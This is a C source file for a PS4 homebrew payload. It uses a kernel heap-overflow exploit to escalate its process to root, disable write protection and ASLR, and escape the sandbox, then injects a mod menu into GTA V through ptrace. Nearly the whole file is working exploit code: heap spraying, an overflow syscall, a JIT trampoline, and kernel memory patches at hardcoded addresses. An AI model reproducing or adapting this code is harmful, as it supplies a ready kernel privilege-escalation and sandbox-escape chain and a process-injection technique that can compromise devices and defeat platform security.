/*2much4u*/

#include "ps4.h"
#include "gta.h"
#include "defines.h"

//Thanks to BadChoicesZ
int (*sceSysUtilSendSystemNotificationWithText)(int messageType, int userID, char* message);

void notify(char *message) {
	char buffer[512];
	sprintf(buffer, "%s\n\n\n\n\n\n\n", message);
	sceSysUtilSendSystemNotificationWithText(36, 0x10000000, buffer);
}

int ptrace(int req, int pid, void* argsAddr, int data);
SYSCALL(ptrace, 26);

void PTRACE(int req, int pid, void* argsAddr, int data) {
	int ret = ptrace(req, pid, argsAddr, data);
	if (ret != 0) {
		PTRACE(req, pid, argsAddr, data);
	}
}

void procAttach(int pid) {
	PTRACE(PT_ATTACH, pid, NULL, NULL);
}

void procDetach(int pid) {
	PTRACE(PT_DETACH, pid, NULL, NULL);
}

void procReadBytes(int pid, void* offset, void* buffer, size_t len) {
	struct ptrace_io_desc pt_desc;
	pt_desc.piod_op = PIOD_READ_D;
	pt_desc.piod_addr = buffer;
	pt_desc.piod_offs = offset;
	pt_desc.piod_len = len;
	PTRACE(PT_IO, pid, &pt_desc, NULL);
}

void procWriteBytes(int pid, void* offset, void *buffer, size_t len) {
	struct ptrace_io_desc pt_desc;
	pt_desc.piod_op = PIOD_WRITE_D;
	pt_desc.piod_addr = buffer;
	pt_desc.piod_offs = offset;
	pt_desc.piod_len = len;
	PTRACE(PT_IO, pid, &pt_desc, NULL);
}

void processPatching(int pid) {
	procAttach(pid);
	
	u64 gameCheck;
	procReadBytes(pid, (void*)RegionCheckAddress, (void*)&gameCheck, sizeof(gameCheck));

	u64 hookAddress = USHookAddress;

	if (gameCheck == USRegionBytes) {
		notify("US GTA V Detected\nMods Activated");
	}
	else if (gameCheck == EURegionBytes) {
		notify("EU GTA V Detected\nMods Activated");
		hookAddress = EUHookAddress;
	}
	else {
		notify("Failed To Detect GTA V");
		procDetach(pid);
		return;
	}
	
	procWriteBytes(pid, (void*)PayloadAddress, (void*)invokeNative_s, 0x100);
	procWriteBytes(pid, (void*)PayloadAddress+0x100, (void*)nativeHook, 0x3000);
	/**
	Increase length for nativeHook when it starts to grow larger.
	For reference, the first version of the simple mod menu needed around 0x3800.
	You will experience seemingly unexplainable crashes if you forget this.
	**/

	uint8_t hookASM[] = { HookBytes };
	procWriteBytes(pid, (void*)hookAddress, (void*)hookASM, sizeof(hookASM));

	procDetach(pid);
}

void *EBOOTMonitorThread(void *n) {
	notify("Payload Loaded\nWaiting For Game...");
	
	BOOL foundEBOOT = FALSE;

	for(;;) {
		if(foundEBOOT == FALSE) {
			for(int i = 0; i < 200; i++) {
				int mib[4];
				size_t len;
				mib[0] = CTL_KERN;
				mib[1] = KERN_PROC;
				mib[2] = KERN_PROC_PID;
				mib[3] = i;
	
				if(sysctl(mib, 4, NULL, &len, NULL, 0) != -1) {
					if(len > 0) {
						void* dump = malloc(len);
						if(sysctl(mib, 4, dump, &len, NULL, 0) != -1) {
							char* name = dump + 0x1bf;
							if(strcmp(name, "eboot.bin") == 0) {
								processPatching(i);
								foundEBOOT = TRUE;
								break;
							}
						}
						free(dump);
					}
				}
			}
			sceKernelSleep(1);
		}
		else break;
	}

	return NULL;
}

void jailbreak(struct knote *kn) {
	struct thread *td;
	struct ucred *cred;

	// Get td pointer
	asm volatile("mov %0, %%gs:0" : "=r"(td));	

	// Disable write protection
	uint64_t cr0 = readCr0();
	writeCr0(cr0 & ~X86_CR0_WP);
	
	// sysctl_machdep_rcmgr_debug_menu and sysctl_machdep_rcmgr_store_moe
	*(uint16_t *)0xFFFFFFFF82607C46 = 0x9090;
	*(uint16_t *)0xFFFFFFFF82607826 = 0x9090;
	
	*(char *)0xFFFFFFFF8332431A = 1;
	*(char *)0xFFFFFFFF83324338 = 1;

	// Version Spoof - Thanks to zecoxao
	*(uint64_t *)0xFFFFFFFF8323A4E0 = 0x9990001;
	
	// Disable Process ASLR - Thanks to ZiL0G80
	*(uint16_t *)0xFFFFFFFF82649C9C = 0x63EB;

	// Restore write protection
	writeCr0(cr0);
	
	// Resolve creds
	cred = td->td_proc->p_ucred;

	// Escalate process to root
	cred->cr_uid = 0;
	cred->cr_ruid = 0;
	cred->cr_rgid = 0;
	cred->cr_groups[0] = 0;

	void *td_ucred = *(void **)(((char *)td) + 304); // p_ucred == td_ucred
	
	// sceSblACMgrIsSystemUcred
	uint64_t *sonyCred = (uint64_t *)(((char *)td_ucred) + 96);
	*sonyCred = 0xffffffffffffffff;
	
	// sceSblACMgrGetDeviceAccessType
	uint64_t *sceProcType = (uint64_t *)(((char *)td_ucred) + 88);
	*sceProcType = 0x3801000000000013; // Max access
	
	// sceSblACMgrHasSceProcessCapability
	uint64_t *sceProcCap = (uint64_t *)(((char *)td_ucred) + 104);
	*sceProcCap = 0xffffffffffffffff; // Sce Process
	
	((uint64_t *)0xFFFFFFFF832CC2E8)[0] = 0x123456; //priv_check_cred bypass with suser_enabled=true
	((uint64_t *)0xFFFFFFFF8323DA18)[0] = 0; // bypass priv_check

	// Jailbreak ;)
	cred->cr_prison = (void *)0xFFFFFFFF83237250; //&prison0

	// Break out of the sandbox
	void *td_fdp = *(void **)(((char *)td->td_proc) + 72);
	uint64_t *td_fdp_fd_rdir = (uint64_t *)(((char *)td_fdp) + 24);
	uint64_t *td_fdp_fd_jdir = (uint64_t *)(((char *)td_fdp) + 32);
	uint64_t *rootvnode = (uint64_t *)0xFFFFFFFF832EF920;
	*td_fdp_fd_rdir = *rootvnode;
	*td_fdp_fd_jdir = *rootvnode;
}

void* kernelFunctionToExecute;

// Perform kernel allocation aligned to 0x800 bytes
int kernelAllocation(size_t size, int fd) {
	SceKernelEqueue queue = 0;
	sceKernelCreateEqueue(&queue, "kexec");

	sceKernelAddReadEvent(queue, fd, 0, NULL);

	return queue;
}

void kernelFree(int allocation) {
	close(allocation);
}

void *exploitThread(void *none) {
	uint64_t bufferSize = 0x8000;
	uint64_t overflowSize = 0x8000;
	uint64_t copySize = bufferSize + overflowSize;
	
	// Round up to nearest multiple of PAGE_SIZE
	uint64_t mappingSize = (copySize + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
	
	uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	munmap(mapping + mappingSize, PAGE_SIZE);
	
	uint8_t *buffer = mapping + mappingSize - copySize;
	
	int64_t count = (0x100000000 + bufferSize) / 4;

	// Create structures
	struct knote kn;
	struct filterops fo;
	struct knote **overflow = (struct knote **)(buffer + bufferSize);
	overflow[2] = &kn;
	kn.kn_fop = &fo;

	// Setup trampoline to gracefully return to the calling thread
	void *trampw = NULL;
	void *trampe = NULL;
	int executableHandle;
	int writableHandle;
	uint8_t trampolinecode[] = {
		0x58, // pop rax
		0x48, 0xB8, 0x19, 0x39, 0x40, 0x82, 0xFF, 0xFF, 0xFF, 0xFF, // movabs rax, 0xffffffff82403919
		0x50, // push rax
		0x48, 0xB8, 0xBE, 0xBA, 0xAD, 0xDE, 0xDE, 0xC0, 0xAD, 0xDE, // movabs rax, 0xdeadc0dedeadbabe
		0xFF, 0xE0 // jmp rax
	};

	// Get Jit memory
	sceKernelJitCreateSharedMemory(0, PAGE_SIZE, PROT_CPU_READ | PROT_CPU_WRITE | PROT_CPU_EXEC, &executableHandle);
	sceKernelJitCreateAliasOfSharedMemory(executableHandle, PROT_CPU_READ | PROT_CPU_WRITE, &writableHandle);

	// Map r+w & r+e
	trampe = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_EXEC, MAP_SHARED, executableHandle, 0);
	trampw = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_TYPE, writableHandle, 0);

	// Copy trampoline to allocated address
	memcpy(trampw, trampolinecode, sizeof(trampolinecode));	
	*(void **)(trampw + 14) = kernelFunctionToExecute;

	// Call trampoline when overflown
	fo.f_detach = trampe;

	// Start the exploit
	int sockets[0x2000];
	int allocation[50], m = 0, m2 = 0;
	int fd = (bufferSize - 0x800) / 8;

	// Create sockets
	for(int i = 0; i < 0x2000; i++) {
		sockets[i] = sceNetSocket("sss", AF_INET, SOCK_STREAM, 0);
		if(sockets[i] >= fd) {
			sockets[i + 1] = -1;
			break;
		}
	}

	// Spray the heap
	for(int i = 0; i < 50; i++) {
		allocation[i] = kernelAllocation(bufferSize, fd);
	}

	// Create hole for the system call's allocation
	m = kernelAllocation(bufferSize, fd);
	m2 = kernelAllocation(bufferSize, fd);
	kernelFree(m);

	// Perform the overflow
	syscall(597, 1, mapping, &count);

	// Execute the payload
	kernelFree(m2);
	
	// Close sockets
	for(int i = 0; i < 0x2000; i++) {
		if(sockets[i] == -1)
			break;
		sceNetSocketClose(sockets[i]);
	}
	
	// Free allocations
	for(int i = 0; i < 50; i++) {
		kernelFree(allocation[i]);
	}
	
	// Free the mapping
	munmap(mapping, mappingSize);
	
	return NULL;
}

void kernelExecute(void* function) {
	kernelFunctionToExecute = function;
	ScePthread pExploitThread;
	scePthreadCreate(&pExploitThread, NULL, exploitThread, NULL, "ExploitThread");
	scePthreadJoin(pExploitThread, NULL);
}

int _main(void) {
	initKernel();
	initLibc();
	initPthread();
	initNetwork();
	initJIT();
	
	int module;
	loadModule("libSceSysUtil.sprx", &module);
	RESOLVE(module, sceSysUtilSendSystemNotificationWithText);

	kernelExecute(jailbreak);

	if(getuid() != 0) {
		notify("Exploit Failed!\nPlease Restart Your Console");
		return 0;
	}

	ScePthread pEBOOTMonitorThread;
	scePthreadCreate(&pEBOOTMonitorThread, NULL, EBOOTMonitorThread, NULL, "EBOOTMonitorThread");
	scePthreadJoin(pEBOOTMonitorThread, NULL);

	return 0;
}
